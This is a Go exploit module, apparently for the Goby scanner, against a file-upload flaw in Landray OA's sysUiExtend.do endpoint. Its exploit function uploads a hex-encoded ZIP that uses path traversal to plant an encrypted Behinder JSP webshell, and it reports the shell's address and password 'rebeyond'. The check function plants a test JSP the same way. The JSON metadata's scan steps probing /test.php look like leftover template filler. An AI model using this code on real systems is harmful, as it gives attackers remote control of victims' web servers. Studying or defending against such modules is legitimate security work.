package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Landray OA sysUiExtend.do File Upload Vulnerability",
    "Description": "<p>Landray OA office system is an OA office tool for instant office communication.</p><p>Landray OA sysUiExtend.do has a file upload vulnerability. By exploiting this vulnerability, an attacker can upload malicious files on the server side, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Landray OA",
    "Homepage": "http://www.landray.com.cn/",
    "DisclosureDate": "2022-08-04",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "(body=\"lui_login_message_td\" && body=\"form_bottom\") || (body=\"蓝凌软件 版权所有\" && (body=\"j_acegi_security_check\" || title=\"欢迎登录智慧协同平台\")) || (body=\"j_acegi_security_check\" && body=\"onsubmit=\\\"return kmss_onsubmit();\" && (body=\"ExceptionTranslationFilter对SPRING_SECURITY_TARGET_URL 进行未登录url保持 请求中的hash并不会传递到服务端，故只能前端处理\" || body=\"kkDownloadLink link\"))",
    "GobyQuery": "(body=\"lui_login_message_td\" && body=\"form_bottom\") || (body=\"蓝凌软件 版权所有\" && (body=\"j_acegi_security_check\" || title=\"欢迎登录智慧协同平台\")) || (body=\"j_acegi_security_check\" && body=\"onsubmit=\\\"return kmss_onsubmit();\" && (body=\"ExceptionTranslationFilter对SPRING_SECURITY_TARGET_URL 进行未登录url保持 请求中的hash并不会传递到服务端，故只能前端处理\" || body=\"kkDownloadLink link\"))",
    "Level": "3",
    "Impact": "<p>Landray OA sysUiExtend.do has a file upload vulnerability. By exploiting this vulnerability, an attacker can upload malicious files on the server side, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.landray.com.cn/\">http://www.landray.com.cn/</a></p><p></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.7",
    "Translation": {
        "CN": {
            "Name": "蓝凌OA sysUiExtend.do 文件上传漏洞",
            "Product": "蓝凌OA",
            "Description": "<p>蓝凌oa办公系统是用于即时办公通讯的oa办公工具。<br></p><p>蓝凌oa sysUiExtend.do 存在文件上传漏洞。攻击者可通过该漏洞在服务器端上传恶意文件，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.landray.com.cn/\">http://www.landray.com.cn/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>蓝凌oa sysUiExtend.do 存在文件上传漏洞。攻击者可通过该漏洞在服务器端上传恶意文件，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Landray OA sysUiExtend.do File Upload Vulnerability",
            "Product": "Landray OA",
            "Description": "<p>Landray&nbsp;OA office system is an OA office tool for instant office communication.</p><p>Landray&nbsp;OA sysUiExtend.do has a file upload vulnerability. By exploiting this vulnerability, an attacker can upload malicious files on the server side, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.landray.com.cn/\">http://www.landray.com.cn/</a><br></p><p></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Landray&nbsp;OA sysUiExtend.do has a file upload vulnerability. By exploiting this vulnerability, an attacker can upload malicious files on the server side, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/sys/ui/extend/varkind/custom.jsp?var=%7B%22body%22%3A%7B%22file%22%3A%22%2Fsys%2Fui%2Fsys_ui_extend%2FsysUiExtend.do%3Fmethod%3Dupload%22%7D%7D"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=a6960107853bf012fe47411093dec8c6")
			fileContent := "50 4B 03 04 14 00 00 00 00 00 0B 5D 90 55 D9 EC CB FF 2C 00 00 00 2C 00 00 00 06 00 00 00 75 69 2E 69 6E 69 6E 61 6D 65 3D 74 65 73 74 0D 0A 69 64 3D 2E 2E 2F 2E 2E 2F 2E 2E 2F 2E 2E 2F 65 6B 70 2F 72 65 73 6F 75 72 63 65 2F 38 32 33 34 65 50 4B 03 04 14 00 00 00 00 00 92 5C 90 55 00 00 00 00 00 00 00 00 00 00 00 00 0F 00 00 00 6C 6F 67 69 6E 5F 74 68 75 6D 62 2E 6A 70 67 50 4B 03 04 14 00 00 00 00 00 B6 5C 90 55 18 B0 25 48 EF 00 00 00 EF 00 00 00 09 00 00 00 6C 6F 67 69 6E 2E 6A 73 70 3C 25 40 20 70 61 67 65 20 6C 61 6E 67 75 61 67 65 3D 22 6A 61 76 61 22 20 63 6F 6E 74 65 6E 74 54 79 70 65 3D 22 74 65 78 74 2F 68 74 6D 6C 3B 20 63 68 61 72 73 65 74 3D 55 54 46 2D 38 22 20 70 61 67 65 45 6E 63 6F 64 69 6E 67 3D 22 55 54 46 2D 38 22 25 3E 0D 0A 20 20 20 20 0D 0A 3C 21 44 4F 43 54 59 50 45 20 68 74 6D 6C 3E 0D 0A 3C 68 74 6D 6C 3E 0D 0A 3C 68 65 61 64 3E 0D 0A 3C 6D 65 74 61 20 63 68 61 72 73 65 74 3D 22 55 54 46 2D 38 22 3E 0D 0A 3C 74 69 74 6C 65 3E 48 65 6C 6C 6F 3C 2F 74 69 74 6C 65 3E 0D 0A 3C 2F 68 65 61 64 3E 0D 0A 3C 62 6F 64 79 3E 0D 0A 09 3C 66 6F 6E 74 20 63 6F 6C 6F 72 3D 72 65 64 3E 48 65 6C 6C 6F 3C 2F 66 6F 6E 74 3E 0D 0A 3C 2F 62 6F 64 79 3E 0D 0A 3C 2F 68 74 6D 6C 3E 0D 0A 50 4B 01 02 14 00 14 00 00 00 00 00 0B 5D 90 55 D9 EC CB FF 2C 00 00 00 2C 00 00 00 06 00 00 00 00 00 00 00 00 00 00 00 B6 81 00 00 00 00 75 69 2E 69 6E 69 50 4B 01 02 14 00 14 00 00 00 00 00 92 5C 90 55 00 00 00 00 00 00 00 00 00 00 00 00 0F 00 00 00 00 00 00 00 00 00 00 00 B6 81 50 00 00 00 6C 6F 67 69 6E 5F 74 68 75 6D 62 2E 6A 70 67 50 4B 01 02 14 00 14 00 00 00 00 00 B6 5C 90 55 18 B0 25 48 EF 00 00 00 EF 00 00 00 09 00 00 00 00 00 00 00 00 00 00 00 B6 81 7D 00 00 00 6C 6F 67 69 6E 2E 6A 73 70 50 4B 05 06 00 00 00 00 03 00 03 00 A8 00 00 00 93 01 00 00 00 00"
			fileContent = strings.ReplaceAll(fileContent, " ", "")
			fileBytes, _ := hex.DecodeString(fileContent)
			payload := fmt.Sprintf("--a6960107853bf012fe47411093dec8c6\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test2.zip\"\r\nContent-Type: application/zip\r\n\r\n%s\r\n--a6960107853bf012fe47411093dec8c6--", fileBytes)
			cfg.Data = payload
			_, err := httpclient.DoHttpRequest(u, cfg)
			if err != nil {
				return false
			}
			uri = "/resource/8234e/login.jsp"
			cfg = httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Hello")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/sys/ui/extend/varkind/custom.jsp?var=%7B%22body%22%3A%7B%22file%22%3A%22%2Fsys%2Fui%2Fsys_ui_extend%2FsysUiExtend.do%3Fmethod%3Dupload%22%7D%7D"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=a6960107853bf012fe47411093dec8c6")
			fileContent := "50 4B 03 04 14 00 00 00 00 00 0D 7A 90 55 C1 BC 55 DA 2C 00 00 00 2C 00 00 00 06 00 00 00 75 69 2E 69 6E 69 6E 61 6D 65 3D 74 65 73 74 0D 0A 69 64 3D 2E 2E 2F 2E 2E 2F 2E 2E 2F 2E 2E 2F 65 6B 70 2F 72 65 73 6F 75 72 63 65 2F 38 34 33 63 32 50 4B 03 04 14 00 00 00 00 00 92 5C 90 55 00 00 00 00 00 00 00 00 00 00 00 00 0F 00 00 00 6C 6F 67 69 6E 5F 74 68 75 6D 62 2E 6A 70 67 50 4B 03 04 14 00 00 00 00 00 B7 56 8E 52 31 39 A8 27 55 02 00 00 55 02 00 00 09 00 00 00 6C 6F 67 69 6E 2E 6A 73 70 3C 25 40 70 61 67 65 20 69 6D 70 6F 72 74 3D 22 6A 61 76 61 2E 75 74 69 6C 2E 2A 2C 6A 61 76 61 78 2E 63 72 79 70 74 6F 2E 2A 2C 6A 61 76 61 78 2E 63 72 79 70 74 6F 2E 73 70 65 63 2E 2A 22 25 3E 3C 25 21 63 6C 61 73 73 20 55 20 65 78 74 65 6E 64 73 20 43 6C 61 73 73 4C 6F 61 64 65 72 7B 55 28 43 6C 61 73 73 4C 6F 61 64 65 72 20 63 29 7B 73 75 70 65 72 28 63 29 3B 7D 70 75 62 6C 69 63 20 43 6C 61 73 73 20 67 28 62 79 74 65 20 5B 5D 62 29 7B 72 65 74 75 72 6E 20 73 75 70 65 72 2E 64 65 66 69 6E 65 43 6C 61 73 73 28 62 2C 30 2C 62 2E 6C 65 6E 67 74 68 29 3B 7D 7D 25 3E 3C 25 69 66 20 28 72 65 71 75 65 73 74 2E 67 65 74 4D 65 74 68 6F 64 28 29 2E 65 71 75 61 6C 73 28 22 50 4F 53 54 22 29 29 7B 53 74 72 69 6E 67 20 6B 3D 22 65 34 35 65 33 32 39 66 65 62 35 64 39 32 35 62 22 3B 2F 2A E8 AF A5 E5 AF 86 E9 92 A5 E4 B8 BA E8 BF 9E E6 8E A5 E5 AF 86 E7 A0 81 33 32 E4 BD 8D 6D 64 35 E5 80 BC E7 9A 84 E5 89 8D 31 36 E4 BD 8D EF BC 8C E9 BB 98 E8 AE A4 E8 BF 9E E6 8E A5 E5 AF 86 E7 A0 81 72 65 62 65 79 6F 6E 64 2A 2F 73 65 73 73 69 6F 6E 2E 70 75 74 56 61 6C 75 65 28 22 75 22 2C 6B 29 3B 43 69 70 68 65 72 20 63 3D 43 69 70 68 65 72 2E 67 65 74 49 6E 73 74 61 6E 63 65 28 22 41 45 53 22 29 3B 63 2E 69 6E 69 74 28 32 2C 6E 65 77 20 53 65 63 72 65 74 4B 65 79 53 70 65 63 28 6B 2E 67 65 74 42 79 74 65 73 28 29 2C 22 41 45 53 22 29 29 3B 6E 65 77 20 55 28 74 68 69 73 2E 67 65 74 43 6C 61 73 73 28 29 2E 67 65 74 43 6C 61 73 73 4C 6F 61 64 65 72 28 29 29 2E 67 28 63 2E 64 6F 46 69 6E 61 6C 28 42 61 73 65 36 34 2E 67 65 74 44 65 63 6F 64 65 72 28 29 2E 64 65 63 6F 64 65 28 72 65 71 75 65 73 74 2E 67 65 74 52 65 61 64 65 72 28 29 2E 72 65 61 64 4C 69 6E 65 28 29 29 29 29 2E 6E 65 77 49 6E 73 74 61 6E 63 65 28 29 2E 65 71 75 61 6C 73 28 70 61 67 65 43 6F 6E 74 65 78 74 29 3B 7D 25 3E 50 4B 01 02 14 00 14 00 00 00 00 00 0D 7A 90 55 C1 BC 55 DA 2C 00 00 00 2C 00 00 00 06 00 00 00 00 00 00 00 00 00 00 00 B6 81 00 00 00 00 75 69 2E 69 6E 69 50 4B 01 02 14 00 14 00 00 00 00 00 92 5C 90 55 00 00 00 00 00 00 00 00 00 00 00 00 0F 00 00 00 00 00 00 00 00 00 00 00 B6 81 50 00 00 00 6C 6F 67 69 6E 5F 74 68 75 6D 62 2E 6A 70 67 50 4B 01 02 14 00 14 00 00 00 00 00 B7 56 8E 52 31 39 A8 27 55 02 00 00 55 02 00 00 09 00 00 00 00 00 00 00 00 00 00 00 B6 81 7D 00 00 00 6C 6F 67 69 6E 2E 6A 73 70 50 4B 05 06 00 00 00 00 03 00 03 00 A8 00 00 00 F9 02 00 00 00 00"
			fileContent = strings.ReplaceAll(fileContent, " ", "")
			fileBytes, _ := hex.DecodeString(fileContent)
			payload := fmt.Sprintf("--a6960107853bf012fe47411093dec8c6\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test3.zip\"\r\nContent-Type: application/zip\r\n\r\n%s\r\n--a6960107853bf012fe47411093dec8c6--", fileBytes)
			cfg.Data = payload
			_, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil {
				return expResult
			}
			// 5. request file
			uri = "/resource/843c2/login.jsp"
			cfg = httpclient.NewGetRequestConfig(uri)
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil {
				return expResult
			}
			if resp.StatusCode == 200 {
				expResult.Success = true
				expResult.Output = "Webshell Addr: " + expResult.HostInfo.FixedHostInfo + uri + "\nWebshell Pass: rebeyond\nUse Behinder to connect"
				return expResult
			}
			return expResult
		},
	))
}
